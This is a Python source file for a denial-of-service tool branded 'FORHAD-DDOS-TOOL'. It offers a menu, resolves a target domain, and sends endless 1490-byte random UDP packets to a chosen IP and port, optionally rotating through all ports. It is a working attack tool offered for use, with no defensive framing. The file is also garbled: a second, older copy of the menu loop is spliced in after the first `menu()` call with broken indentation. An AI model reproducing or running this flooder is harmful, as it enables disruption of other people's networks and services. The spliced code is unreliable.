#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FORHAD-DDOS-TOOL v3.1
Author: Forhad Hasan
GitHub: https://github.com/Forhadj
License: MIT
"""

import os
import socket
import random
import time
from platform import system

# Version
VERSION = "3.1"

# Detect OS for clear command
cmd_clear = "cls" if system() == "Windows" else "clear"

# Function to clear screen
def clear():
    os.system(cmd_clear)

# FORHAD ASCII Logo (Random Color)
def logo():
    colors = [
        "\033[91m",  # Red
        "\033[92m",  # Green
        "\033[93m",  # Yellow
        "\033[94m",  # Blue
        "\033[95m",  # Magenta
        "\033[96m",  # Cyan
    ]
    color = random.choice(colors)
    print(color)
    print(r"""
####### ####### ######  #     #    #    ######  
#       #     # #     # #     #   # #   #     # 
#       #     # #     # #     #  #   #  #     # 
#####   #     # ######  ####### #     # #     # 
#       #     # #   #   #     # ####### #     # 
#       #     # #    #  #     # #     # #     # 
#       ####### #     # #     # #     # ######

 .  . .  .  . .  .  . .  .  . .  .  . .  .  . .  .  . .  . 
 .;.       .       .   :@tt8S   X8t%X.     .       .     .t.
 tXS .  .    .  .    .@ X@@@8888@@@@8@8..    .  .    .  .88;
 t  t    .       . .@S88@@@@@@@@@@@@@@8@8  .     .      8  :
 : 8:S.    .  .   ;88X@@@@@@@@@@@@@@@@@@8X;   .    .  :;S@8.
  tXXSS. .   .  . t8X@@@@@@88X88@88@@X@@X8. .   .   . .8X@: 
  @@@XX:;  .     8%X@@@@@888888888@X88@@@@t8  .   . tS8@@S8 
  .%8@@@.;:   . .X@@tXX88@@@@8@@8@888@@@%8@.    . :.;XX@8;  
   % @@@X8@t    .8XS88@@8@@@@@@@@@@@@@@8@@X% .   t88X@@@ :  
 .  @tXX8X8.;;  .%@ %8@@X@@@@X88S88@X8@8%.8    ;:.8S8@X:8  .
    .8 8@8 :@;t% 8SX@ .:::8t88888.X :.t SX@@ S;t@: 8@8XX    
  .   ; 888SS8@;t %.:%    .S:@@@ : .   XS.;.t;S8@ 8X@8; .  .
       :S@@8.8.@888:t@ . . 8t8.8:X.    8@ @888.8 8@Xt;      
  . .    X88@8 88;t%@ .:.X 88%. 88 % :: 88.t88.8@X@X   .  . 
       .  .@;X@8S@ 888@@@@8@8 .: 88@@@8@@@8X 8@@.8  .       
  .  .     .S;;@@X8@    t@@@ % ; X@8t.. XX8X@8:.%     . . . 
    .   .    .:X8X@8 %.@;8X@@88@@@@@%  S:8@S88.    .        
  .   .   .   .  @888t ;X@8@8@88888%Xt %@8@X   .     .  .  .
        .   .   . .8;t.8t:SS8.8.@@St.8 S:@.  .   . .     .  
  . .     . .%S;     t 8@X..t : %. S8@8:   . ;Xt.     .     
      . .   :%8SS  .  8:XX8@@8X88@@@@ @  .  X @;;  .   .  . 
  .  .    .: @88.  tX@ tX%%8@X@@@@8tS% SXt  :8X@8.   .      
        .   ;..@8S %S @@.@ @     %;  88 :X 88@ ;; .     . . 
  . . .     .tt8% 8%S;X8 tt       ;t 8@.%;8 @@X;.   . .     
         .St@.@8@ S t ;8.           .8.S% S 888 8;%      .  
  . :X@XX8t8S8@SX8SX@;   .          . .SXXX8S88888:8;X@X.  .
   .%88% %:.@.@8:@@@8%:              ..S@@8t:8X:8 .8%X@8:.  
  .XtS@.t 888t .:@88@%@: . .     .   t @@8X@%. %88@ ;tX@:@  
  ..:;8S%S;::Xt ;;:@.t%      . .   .  %:.8;SS @S:::X@X8:::. 
   ..t88 S% .88X8      .  .           .    .8 X@: ;8@88:.   
 .   .  %S.. S@:   .        .  . . .    .     8% .:@S..    .
   .       .         .  . .          .    .      .      .

         FORHAD-DDOS-TOOL v3.1 | UDP Flooder
    """)
    print("\033[0m")  # Reset color

# Function to get IP and common ports
def resolve_ip(domain):
    try:
        ip = socket.gethostbyname(domain)
        common_ports = [80, 443, 21, 22, 25, 3389, 8080, 53, 110, 143]
        return ip, common_ports
    except socket.gaierror:
        return None, None

# UDP Flood Function
def udp_flood(ip, port, rotate_ports=False):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1490)
    sent = 0

    try:
        while True:
            if rotate_ports:
                if port >= 65534:
                    port = 1
                elif port == 1900:
                    port = 1901
            sock.sendto(payload, (ip, port))
            sent += 1
            print(f"\033[32;1m[✓] Sent {sent} packets to {ip}:{port}\033[0m")
            if rotate_ports:
                port += 1
    except KeyboardInterrupt:
        print("\n\033[31;1m[!] Attack stopped by user.\033[0m")

# Menu System
def menu():
    while True:
        clear()
        logo()
        print("╔══════════════════════════════╗")
        print("║      \033[93mFORHAD-DDOS-TOOL v3.1\033[0m      ║")
        print("╚══════════════════════════════╝")
        print("[1] Start UDP Flood")
        print("[2] About")
        print("[0] Exit")

        choice = input("\n>> Enter your choice: ").strip()

        if choice == "1":
            domain_or_ip = input("\n[?] Target Domain or IP? (d/i): ").lower()
            if domain_or_ip == "d":
                domain = input("[+] Enter Domain: ")
                ip, ports = resolve_ip(domain)
                if not ip:
                    print("[x] Invalid domain!")
                    time.sleep(2)
                    continue
                print(f"[✓] Domain resolved to IP: {ip}")
                print(f"[✓] Common Ports: {ports}")
            elif domain_or_ip == "i":
                ip = input("[+] Enter IP Address: ")
                ports = None
            else:
                print("[x] Invalid choice!")
                time.sleep(2)
                continue

            port_mode = input("[?] Certain port? (y/n): ").lower()
            rotate_ports = False
            if port_mode == "y":
                try:
                    port = int(input("[+] Enter Port: "))
                except:
                    print("[x] Invalid port!")
                    time.sleep(2)
                    continue
            else:
                port = 2
                rotate_ports = True

            print("\n\033[36;2m[~] INITIALIZING ATTACK...\033[0m")
            time.sleep(1)
            udp_flood(ip, port, rotate_ports)

        elif choice == "2":
            clear()
            logo()
            print("\n\033[92m[•] Author:\033[0m Forhad Hasan")
            print("\033[92m[•] GitHub:\033[0m https://github.com/Forhadj")
            print("\033[92m[•] Version:\033[0m", VERSION)
            input("\nPress Enter to return to menu...")

        elif choice == "0":
            print("Goodbye!")
            break

        else:
            print("[x] Invalid option!")
            time.sleep(2)

# Run the menu
if __name__ == "__main__":
    menu()    while True:
        clear()
        logo()
        print("╔══════════════════════════════╗")
        print("║      \033[93mFORHAD-DDOS-TOOL v3\033[0m      ║")
        print("╚══════════════════════════════╝")
        print("[1] Start UDP Flood")
        print("[2] About")
        print("[0] Exit")

        choice = input("\n>> Enter your choice: ").strip()

        if choice == "1":
            target_type = input("\n[?] Target is Domain or IP? (d/i): ").lower()
            if target_type == "d":
                domain = input("[+] Enter Domain: ")
                try:
                    ip = socket.gethostbyname(domain)
                    print(f"[✓] Domain resolved to {ip}")
                except socket.gaierror:
                    print("[x] Invalid domain!")
                    time.sleep(2)
                    continue
            elif target_type == "i":
                ip = input("[+] Enter IP Address: ")
            else:
                print("[x] Invalid choice!")
                time.sleep(2)
                continue

            port_mode = input("[?] Certain port? (y/n): ").lower()
            rotate_ports = False
            if port_mode == "y":
                try:
                    port = int(input("[+] Enter Port: "))
                except:
                    print("[x] Invalid port!")
                    time.sleep(2)
                    continue
            elif port_mode == "n":
                port = 2
                rotate_ports = True
            else:
                print("[x] Invalid choice!")
                time.sleep(2)
                continue

            print("\n\033[36;2m[~] INITIALIZING ATTACK...\033[0m")
            time.sleep(1)
            udp_flood(ip, port, rotate_ports)

        elif choice == "2":
            clear()
            logo()
            print("\n\033[92m[•] Author:\033[0m Forhad Hasan")
            print("\033[92m[•] GitHub:\033[0m https://github.com/Forhadj")
            print("\033[92m[•] Version:\033[0m", VERSION)
            input("\nPress Enter to return to menu...")

        elif choice == "0":
            print("Goodbye!")
            break

        else:
            print("[x] Invalid option!")
            time.sleep(2)

# Run the menu
if __name__ == "__main__":
    menu()
